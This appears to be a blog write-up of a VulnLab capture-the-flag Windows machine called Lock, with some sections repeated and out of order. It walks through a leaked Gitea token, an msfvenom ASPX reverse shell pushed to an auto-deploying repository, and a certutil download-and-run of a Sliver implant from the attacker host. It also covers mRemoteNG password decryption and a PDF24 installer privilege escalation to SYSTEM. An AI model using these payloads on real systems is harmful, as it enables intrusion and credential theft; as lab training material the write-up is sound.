machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Gitea\\data&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>You can curl the Sliver implant after creating it to the machine by using <code>certutil.exe</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; certutil.exe -urlcache -f http://10.8.0.173:9002/lock.exe lock.exe; .\\lock.exe</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a decent amount of programs installed on the machine, however you’ll notice that there are two users within <code>C:\\Users</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Directory: C:\\Users</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                                           </span><br><span class=\"line\">----                 -------------         ------ ----   </span><br><span class=\"line\">d-----        12/27/2023   2:00 PM                .NET v4.5                                      </span><br><span class=\"line\">d-----        12/27/2023   2:00 PM                .NET v4.5 Classic</span><br><span class=\"line\">d-----        12/27/2023  12:01 PM                Administrator    </span><br><span class=\"line\">d-----        12/28/2023  11:36 AM                ellen.freeman  </span><br><span class=\"line\">d-----        12/28/2023   6:14 AM                gale.dekarios  </span><br><span class=\"line\">d-r---        12/27/2023  10:21 AM                Public</span><br></pre></td></tr></table></figure>\n\n<p>What’s interesting is that we have access to <code>ellen.freeman</code>‘s home directory. While there isn’t a flag in this user’s home directory, there is an interesting file in their home directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\ellen.freeman\\Documents&gt; cat config.xml</span><br><span class=\"line\">cat config.xml</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;mrng:Connections xmlns:mrng=&quot;http://mremoteng.org&quot; Name=&quot;Connections&quot; Export=&quot;false&quot; EncryptionEngine=&quot;AES&quot; BlockCipherMode=&quot;GCM&quot; KdfIterations=&quot;1000&quot; FullFileEncryption=&quot;false&quot; Protected=&quot;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&quot; ConfVersion=&quot;2.6&quot;&gt;</span><br><span class=\"line\">&lt;Node Name=&quot;RDP/Gale&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that this is an XML file containing the password information for the user <code>Gale.Dekarios</code>. This was the other user within <code>C:\\Users</code> aside from <code>ellen.freeman</code>.</p>\n<p>The file itself seems to be related to <code>mRemoteNG</code> and also having an affiliation with RDP. Assuming that we are able to crack the hash within this XML, we could login as this user.</p>\n<h1 id=\"Decrypting-mRemoteNG-Hashes\"><a href=\"#Decrypting-mRemoteNG-Hashes\" class=\"headerlink\" title=\"Decrypting mRemoteNG Hashes\"></a>Decrypting mRemoteNG Hashes</h1><p>I did a bit of research into mRemoteNG, and it seems to be an application that function relatively similarly to RDP. Our application at hand is a fork of mRemote, which is an open-source remote connection manager for Windows. This specific application supports protocols such as RDP, VNC, SSH, and may more. You can find documentation related to mRemoteNG <a href=\"https://mremoteng.readthedocs.io/en/v1.77.3-dev/\">here</a>.</p>\n<p>I also found a repository that contains a decryption script for mRemoteNG specifically. You can find that <a href=\"https://github.com/gquere/mRemoteNG_password_decrypt\">here</a>. Note that if it now prompting you to enter credentials when you clone the repository, that is due to the fact that a <code>.gitconfig</code> file was created in your home directory when we were exploiting Gitea earlier. You can delete this <code>.gitconfig</code> file to prevent it for prompting you for credentials.</p>\n<p>The script itself seems to be utilizing AES and PBKDF2_HMAC_SHA1 decryption in order to retrieve the plaintext password. The script uses the salt specified in <code>config.xml</code> and Base64 decoding in order to decrypt the password.</p>\n<p>Let’s download this config file containing the credentials to our machine and run the script against it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 mRemoteNG_password_decrypt/mremoteng_decrypt.py config.xml  </span><br><span class=\"line\">Name: RDP/Gale</span><br><span class=\"line\">Hostname: Lock</span><br><span class=\"line\">Username: Gale.Dekarios</span><br><span class=\"line\">Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though the password was decrypted successfully! We should be able to log in as <code>Gale.Dekarios</code> through RDP, given that mRemoteNG supports RDP as a protocol.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ xfreerdp /v:10.10.66.232 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/lock-vl/h.png\"></p>\n<h1 id=\"Exploiting-PDF24\"><a href=\"#Exploiting-PDF24\" class=\"headerlink\" title=\"Exploiting PDF24\"></a>Exploiting PDF24</h1><p>The user flag is located within the user’s Desktop directory, as you can see from the landing page for RDP. Given that we have this user flag now, we’ll need to exploit something in order to gain elevated privileges to Administrator.</p>\n<p>Let’s check our privileges in order to determine whether or not we can exploit any misconfigured privileges for this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\gale.dekarios&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== ========</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>\n\n<p>We don’t have any privileges aside from the default privileges that are given to regular users.</p>\n<p>One of the key thought processes I use for privilege escalation against Windows is understanding the three types of ways that privilege escalation can be obtained. This can be achieved either by <strong>exploiting misconfigured privileges</strong>, <strong>exploiting LDAP objects</strong>, and <strong>exploiting internal applications</strong>. Given that we don’t have any way to exploit the first two, let’s look around for any applications that are installed.</p>\n<p>Immediately on the home screen, you’ll notice that there’s an odd application installed called PDF24. The interesting part about this file is not in the application itself, but the fact that there is a hidden installation directory with the installer to this application on the machine.</p>\n<p><img src=\"/images/vulnlab/lock-vl/i.png\"></p>\n<p>Let’s do some research into this binary and see if there are any ways that we could potentially exploit it.</p>\n<p>Almost immediately, I found a local privilege escalation vulnerability to PDF24 through the installer that I had referred to before. You can find information about that <a href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.\">here</a>.</p>\n<p>It seems as though the MSI installer of this application is vulnerable to a local privilege escalation vulnerability, which can only be achieved with GUI access. Given that we have RDP access, this presents itself as a valid attack path for us to receive SYSTEM. The exploit works when using the repair function with <code>msiexec.exe</code>, as a SYSTEM level command shell is utilized in order to suffice the installation process.</p>\n<p>During the installation, we can utilize a tool called <a href=\"https://github.com/googleprojectzero/symboliclink-testing-tools\">SetOpLock</a>. This is within the <code>symbolic-testing-tools</code> suite that seems to be a relatively normal application. This application could be vulnerable to AV, however it does not seem to be an issue in our case since AV is enabled.</p>\n<p>To explain as to what this binary will do, it will essentially create a breakpoint on the opcode where <code>PDF24-PrinterInstall.exe</code> is called. The reason for this is that a SYSTEM shell is spawned by the machine in order to install this specific portion, and if we are able to pause the shell at the moment it is called, we can exploit the shell to exploit commands for us. This should lead to us getting access to the shell with SYSTEM privileges.</p>\n<p>So with that, let’s compile the executable with Visual Studio and transfer it to our Kali machine, then finally to the RDP session. I did this locally, though if you are running WSL or any alternative with Windows you should be able to exploit this without needing to transfer this through SSH to your Kali machine. Make sure to build the <code>Release/x64</code> version of this binary so it works correctly.</p>\n<p>Let’s first run the installation as directed in the article.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_install&gt; .\\SetOpLock.exe &quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure>\n\n<p>After the installation process starts up, run the below command to execute the oplock hang. If it is working successfully, you should NOT receive an output.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_install&gt; .\\SetOpLock.exe &quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure>\n\n<p>During the end of this process, you’ll see a SYSTEM shell pop up. If this SYSTEM shell remains on the screen, that means the opcode lock worked correctly. However, if the SYSTEM shell pops up for a brief moment and goes away, then there was some form of error with the binary.</p>\n<p><img src=\"/images/vulnlab/lock-vl/j.png\"></p>\n<p>We now technically have a SYSTEM shell, though we don’t have any way to type anything. If we continue to follow the article, we can use Firefox to launch a SYSTEM shell based on the context of the frozen shell currently in front of us.</p>\n<p>First, right-click on the top bar of the command shell window. This should bring up a small details interface.</p>\n<p>Then, we’ll select properties to view the current properties of the shell.</p>\n<p>We’ll then select the the <code>legacy console mode</code> hyperlink towards the bottom of the properties pane. This should open up a Firefox session in the context of SYSTEM.</p>\n<p>Within Firefox, we can now press the hotkey <code>Ctrl + O</code> to open up the filesystem. Remember, we are still running this in the context of SYSTEM.</p>\n<p>Finally, type <code>cmd.exe</code> into the search bar, which should save <code>cmd.exe</code> locally and allow you to run it by clicking on it in the <code>Downloads pane</code>.</p>\n<p>If all was done correctly, you should have a shell as SYSTEM!</p>\n<p><img src=\"/images/vulnlab/lock-vl/k.png\"></p>\n<p>Now that we have access to this machine as SYSTEM, we essentially have control over the entirety of the machine and all of its files. We should be able to access the root flag in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>. This means we have successfully compromised this machine!</p>\n<p><img src=\"/images/vulnlab/lock-vl/l.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was very entertaining, especially the PDF24 local privilege escalation portion. The fact that setting the opcode perfectly at the only point in time where a SYSTEM shell was executed made perfect sense logically. Furthermore, the start of the machine really tests your ability to prevent going down rabbit holes. This is a nice change of pace, and don’t forget to test EVERYTHING out and don’t hang on something for too long! Big thanks to xct and kozie for the development of this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://docs.gitea.com/next/development/api-usage\">https://docs.gitea.com/next/development/api-usage</a><br><a href=\"https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\">https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom</a><br><a href=\"https://mremoteng.readthedocs.io/en/v1.77.3-dev/\">https://mremoteng.readthedocs.io/en/v1.77.3-dev/</a><br><a href=\"https://github.com/gquere/mRemoteNG_password_decrypt\">https://github.com/gquere/mRemoteNG_password_decrypt</a><br><a href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level\">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level</a>.<br><a href=\"https://github.com/googleprojectzero/symboliclink-testing-tools\">https://github.com/googleprojectzero/symboliclink-testing-tools</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This is the last writeup I have documented for all of the Easy machines as of 6&#x2F;3. This machine in particular is related to Gitea, a web-application that we’ve pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 17:05 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.82.24</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 65529 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\">5985/tcp open  wsman</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 607.91 seconds</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be an SMB server, however null authentication does not allow us to view the service. This means we’ll need credentials if we want to access this service.</p>\n<p>There is a web server running on port 80, so we’ll take a look at that to see what we can find.</p>\n<p><img src=\"/images/vulnlab/lock-vl/b.png\"></p>\n<p>We seem to be within a basic IIS website that use Lightbox and AOS JS. The web framework for this is Microsoft ASP.NET, indicating to us that this machine is a Windows server.</p>\n<p>I ran a directory enumeration scan as described below, however no pertinent results seem to return.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.82.24 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">/assets               (Status: 301) [Size: 149] [--&gt; http://10.10.82.24/assets/]</span><br></pre></td></tr></table></figure>\n\n<p>There is however an <code>/assets</code> folder that is returned that we do not have access to. Attempting to follow the redirect will bring you to a <code>403</code> error, indicating that we do not have the correct authorization to view this page.</p>\n<p><img src=\"/images/vulnlab/lock-vl/c.png\"></p>\n<p>Let’s move onto port 3000. I’ve dealt with this port a few times before for these writeups on VulnLab, and you can find information about this specific port <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>. There are a variety of different web applications that can be hosted on this port, and we’ve dealt with Gitea and Grafana in the past.</p>\n<p>Accessing this port through HTTP seems to bring us to another familiar site - Gitea.</p>\n<p><img src=\"/images/vulnlab/lock-vl/d.png\"></p>\n<p>The only difference in our case for this machine is that there is no register option, as there was for Build. That being said, we can run another <code>gobuster</code> scan on this port to determine if there are any resources that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/admin                (Status: 303) [Size: 38] [--&gt; /user/login]</span><br><span class=\"line\">/issues               (Status: 303) [Size: 38] [--&gt; /user/login]</span><br><span class=\"line\">/v2                   (Status: 401) [Size: 50]</span><br><span class=\"line\">/explore              (Status: 303) [Size: 41] [--&gt; /explore/repos]</span><br><span class=\"line\">/administrator        (Status: 200) [Size: 16427]</span><br></pre></td></tr></table></figure>\n\n<p>We seem to receive a 200 request on <code>/administrator</code>, along with the indication of a potential API on <code>/v2</code>. If we attempt to access <code>/administrator</code>, it seems that Gitea authenticates us to the web service. This more than likely is a misconfiguration that shouldn’t be here, but nonetheless we were able to access the internal resources for Gitea.</p>\n<p>If you visit the <code>Explore</code> tab, you’ll see that there is a repository for ellen.freeman denoted as <code>dev-scripts</code>. Accessing this will give us the ability to view a Python file denoted as <code>repos.py</code>.</p>\n<p>Following the file seems to bring us to a Python script that is affiliated with the API. The script is attempting to receive a repository based on the domain name of the machine and retrieves a Git access token to check authentication for the current user. The script then parses the users repositories on GITEA before executing the script.</p>\n<p>You’ll notice though from the main branch of the repository that there are two commits to this branch. We are currently viewing the most recent commit, however if we view the first commit to this branch we’ll find some interesting information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">PERSONAL_ACCESS_TOKEN = &#x27;43ce39bb0bd6bc489284f2905f033ca467a6362f&#x27;</span><br><span class=\"line\">import os</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a personal Git access token on the first commit for the file. This was more than likely the case of a user putting this here temporarily before making the proper commits to the update main file. We can guess that the user forgot to delete our ability to view this commit - which lead to our visibility of it. We’ll cache this in the meanwhile as we continue to enumerate into the machine more.</p>\n<p>If you go back to the main file, you’ll see that there’s a path to the API denoted as <code>/api/v1/user/repos</code>. I’m going to assume that this specifically is related to the GITEA website that we’re on, however there’s the potential for it to be linked to the main website.</p>\n<p><img src=\"/images/vulnlab/lock-vl/e.png\"></p>\n<p>The API seems to tell us that a token is required, and references us to another directory denoted as <code>/api/swagger</code>. Let’s try to access this to retrieve the necessary token required.</p>\n<p><img src=\"/images/vulnlab/lock-vl/f.png\"></p>\n<p>This brings us to the Gitea API, which seems to have all the web resources that Gitea uses in terms of authorization and request management. We have various tabs here denoted for administration, the specific user information, repository information, and many more.</p>\n<p>I did some research into the Gitea API and it seems that there is some information regarding the API and token generation. You can find the source I used for this <a href=\"https://docs.gitea.com/next/development/api-usage\">here</a>. Given what we know based on the research, it seems as though we can use cURL for this functionality. Note at this point I did take a break, so the IP addresses may change.</p>\n<p>I looked into this API functionality for quite some time, however I couldn’t manage to use it for really anything. It seems like we have the ability to execute a function to receive a token, but our authorization seems to be invalid. After a bit of continuous messing around with next to no progress, I deduced this to be a rabbit hole.</p>\n<h1 id=\"Reversing-the-Git-Repo\"><a href=\"#Reversing-the-Git-Repo\" class=\"headerlink\" title=\"Reversing the Git Repo\"></a>Reversing the Git Repo</h1><p>I want to turn our attention back to the Git repository that we found earlier. We have a GITEA access token, meaning we can potentially push to the branch of the repositories that we have access to. For <code>ellen.freeman</code>, you could only see the <code>dev-scripts</code> repository. However, let’s take a look at this at command-line as you’ll find something a bit odd.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git clone http://10.10.69.193:3000/ellen.freeman/dev-scripts.git</span><br></pre></td></tr></table></figure>\n\n<p>If we examine the code a bit again, you’ll see that we need two parameters for this. The first is ensuring that our GITEA_ACCESS_TOKEN environment variable is set to an access token that we own. As you already know, we have access to <code>ellen.freeman</code>‘s token. The second parameter that is needed is the link to the GITEA instance on port <code>3000</code>.</p>\n<p>Let’s also be sure to set the GITEA_ACCESS_TOKEN global variable to ensure that if there is any authentication required, we can access the machine properly. <code>export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python repos.py http://10.10.69.193:3000</span><br><span class=\"line\">/home/daz/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.9) doesn&#x27;t match a supported version!</span><br><span class=\"line\">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;t match a supported &quot;</span><br><span class=\"line\">Repositories:</span><br><span class=\"line\">- ellen.freeman/dev-scripts</span><br><span class=\"line\">- ellen.freeman/website</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is another repository that was returned that wasn’t originally in the GITEA interface, being <code>website</code>. This repo seems to be unpublished from the GITEA instance, as if you attempt to access it on the web server it will return a 404.</p>\n<p>Though we aren’t able to see this repository, we can assume that if we were authenticated as <code>ellen.freeman</code>, we would be able to see it on our end. We can try to configure our Git authorization locally using the access token and download the repository remotely.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git config --global http.extraHeader &quot;Authorization: token $GITEA_ACCESS_TOKEN&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ git clone http://10.10.69.193:3000/ellen.freeman/website                       </span><br><span class=\"line\">Cloning into &#x27;website&#x27;...</span><br><span class=\"line\">remote: Enumerating objects: 165, done.</span><br><span class=\"line\">remote: Counting objects: 100% (165/165), done.</span><br><span class=\"line\">remote: Compressing objects: 100% (128/128), done.</span><br><span class=\"line\">remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0</span><br><span class=\"line\">Receiving objects: 100% (165/165), 7.16 MiB | 1.00 MiB/s, done.</span><br><span class=\"line\">Resolving deltas: 100% (35/35), done.</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is a file within this denoted as <code>readme.md</code> and it contains the following information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># New Project Website</span><br><span class=\"line\"></span><br><span class=\"line\">CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver</span><br></pre></td></tr></table></figure>\n\n<p>This indicates to me that any changes to this repository automatically change the website that is being hosted from it. If you’ll look at the <code>index.html</code> page that is within this directory, you’ll find the HTML of the website we were previously on. This also contains the assets folder that we previously did not have access to.</p>\n<p>With what this readme note is telling us, if we are able to commit to this repository, it should automatically deploy to the website on port 80. Thus, if we are able to add a reverse shell to this website, we may be able to receive a session on the website.</p>\n<p>In that case, we’ll create a reverse shell with <a href=\"https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\">MSFVenom</a>. I’ve found more luck utilizing an ASPX reverse shell on websites that run IIS, so we’ll go with that extension.</p>\n<p>One thing you can do to confirm our above theory is attempt to access <code>changelog.txt</code> on the main website. It should return the same text file that we have in our cloned git repository locally.</p>\n<p><img src=\"/images/vulnlab/lock-vl/g.png\"></p>\n<h1 id=\"RCE-via-Git-Commits\"><a href=\"#RCE-via-Git-Commits\" class=\"headerlink\" title=\"RCE via Git Commits\"></a>RCE via Git Commits</h1><p>So let’s start by creating an ASPX reverse shell with MSFVenom.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f aspx &gt; daz.aspx</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 354 bytes</span><br><span class=\"line\">Final size of aspx file: 2906 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll now put our reverse shell within the same directory as the website assets, if it wasn’t already.</p>\n<p>You’ll see that there is no need for us to initialize this git repository, as the folder has already been preconfigured if you run <code>ls -la</code>. The <code>.git</code> submodule indicates that to us.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls -la </span><br><span class=\"line\">total 44</span><br><span class=\"line\">drwxrwxr-x 4 daz daz  4096 Jun  3 21:31 .</span><br><span class=\"line\">drwxrwxr-x 4 daz daz  4096 Jun  3 21:23 ..</span><br><span class=\"line\">drwxrwxr-x 8 daz daz  4096 Jun  3 21:23 .git</span><br><span class=\"line\">drwxrwxr-x 6 daz daz  4096 Jun  3 21:23 assets</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz    43 Jun  3 21:23 changelog.txt</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz  2906 Jun  3 21:32 daz.aspx</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz 15708 Jun  3 21:23 index.html</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz   130 Jun  3 21:23 readme.md</span><br></pre></td></tr></table></figure>\n\n<p>Next, we can add all of the new additions to the repository (being our reverse shell and the README.md file) and commit them to the branch. We will then push to the main branch and the files should be uploaded correctly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git add -A; git commit -m &quot;DaZ Commit 1&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ git push origin main                    </span><br><span class=\"line\">Enumerating objects: 4, done.</span><br><span class=\"line\">Counting objects: 100% (4/4), done.</span><br><span class=\"line\">Delta compression using up to 4 threads</span><br><span class=\"line\">Compressing objects: 100% (3/3), done.</span><br><span class=\"line\">Writing objects: 100% (3/3), 1.32 KiB | 1.32 MiB/s, done.</span><br><span class=\"line\">Total 3 (delta 1), reused 0 (delta 0), pack-reused 0</span><br><span class=\"line\">remote: . Processing 1 references</span><br><span class=\"line\">remote: Processed 1 references in total</span><br><span class=\"line\">To http://10.10.69.193:3000/ellen.freeman/website</span><br><span class=\"line\">   73cdcc1..9dac976  main -&gt; main</span><br></pre></td></tr></table></figure>\n\n<p>Before we execute the file, we’ll start up <code>msfconsole</code> and configure the listener based on our payload. We’re using a meterpreter payload, so we’ll need to set that up in <code>exploit/multi/handler</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LHOST 10.8.0.173</span><br><span class=\"line\">LHOST =&gt; 10.8.0.173</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LPORT 9001</span><br><span class=\"line\">LPORT =&gt; 9001</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; exploit</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started reverse TCP handler on 10.8.0.173:9001</span><br></pre></td></tr></table></figure>\n\n<p>Note that my IP address adjust due to some conflictions I was having with the website - I made sure to reload the machine and it worked fine. The new IP address is <code>10.10.66.232</code>. Now that’s finished, we’ll access the website to execute our payload. We can simply curl the payload from our terminal in order to execute it. <code>curl http://10.10.66.232</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Command shell session 1 opened (10.8.0.173:9001 -&gt; 10.10.66.232:49892) at 2024-06-03 22:24:55 -0400</span><br><span class=\"line\"></span><br><span class=\"line\">Shell Banner:</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.2159]</span><br><span class=\"line\">-----</span><br><span class=\"line\">c:\\windows\\system32\\inetsrv&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Reconnaissance-on-Host\"><a href=\"#Reconnaissance-on-Host\" class=\"headerlink\" title=\"Reconnaissance on Host\"></a>Reconnaissance on Host</h1><p>Now that we have access to the machine, we can look around to see if there’s any files that will return any valid information. We’re currently running as <code>inetsrv</code>, meaning we’ll need to compromise a user in order to progress any further.</p>\n<p>I set up a Sliver C2 server on this machine to ensure that we could access the resources to and from relatively easily. I normally use Havoc on Windows machines, though as you can see there is no AV enabled on this machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Gitea\\data&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>You can curl the Sliver implant after creating it to the machine by using <code>certutil.exe</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; certutil.exe -urlcache -f http://10.8.0.173:9002/lock.exe lock.exe; .\\lock.exe</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a decent amount of programs installed on the machine, however you’ll notice that there are two users within <code>C:\\Users</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Directory: C:\\Users</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                                           </span><br><span class=\"line\">----                 -------------         ------ ----   </span><br><span class=\"line\">d-----        12/27/2023   2:00 PM                .NET v4.5                                      </span><br><span class=\"line\">d-----        12/27/2023   2:00 PM                .NET v4.5 Classic</span><br><span class=\"line\">d-----        12/27/2023  12:01 PM                Administrator    </span><br><span class=\"line\">d-----        12/28/2023  11:36 AM                ellen.freeman  </span><br><span class=\"line\">d-----        12/28/2023   6:14 AM                gale.dekarios  </span><br><span class=\"line\">d-r---        12/27/2023  10:21 AM                Public</span><br></pre></td></tr></table></figure>\n\n<p>What’s interesting is that we have access to <code>ellen.freeman</code>‘s home directory. While there isn’t a flag in this user’s home directory, there is an interesting file in their home directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\ellen.freeman\\Documents&gt; cat config.xml</span><br><span class=\"line\">cat config.xml</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;mrng:Connections xmlns:mrng=&quot;http://mremoteng.org&quot; Name=&quot;Connections&quot; Export=&quot;false&quot; EncryptionEngine=&quot;AES&quot; BlockCipherMode=&quot;GCM&quot; KdfIterations=&quot;1000&quot; FullFileEncryption=&quot;false&quot; Protected=&quot;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&quot; ConfVersion=&quot;2.6&quot;&gt;</span><br><span class=\"line\">&lt;Node Name=&quot;RDP/Gale&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot;</span><br><span 